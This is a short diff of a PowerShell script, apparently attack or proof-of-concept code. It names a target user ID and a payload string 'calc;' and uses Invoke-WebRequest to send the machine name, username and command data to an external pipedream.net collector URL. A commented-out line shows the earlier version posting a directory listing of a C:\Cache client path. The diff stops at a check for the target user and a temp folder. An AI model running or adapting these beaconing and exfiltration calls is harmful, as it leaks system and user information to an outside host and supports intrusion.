@@ -1,10 +1,10 @@
 $target_user = "41341"
 $command = "calc;"
-curl https://enozw8a1fwe1j.x.pipedream.net/$env:computername/$env:username
+iwr -uri https://enozw8a1fwe1j.x.pipedream.net/$env:computername/$env:username -d $command
 
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
-#iwr -uri https://enozw8a1fwe1j.x.pipedream.net/$env:computername/$env:username -Body (Out-String -InputObject $e) -Method post
+iwr -uri https://enozw8a1fwe1j.x.pipedream.net/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
  
 if ( $Env:UserName -eq $target_user) {
 	if (Test-Path "C:\Cache\tmp"){
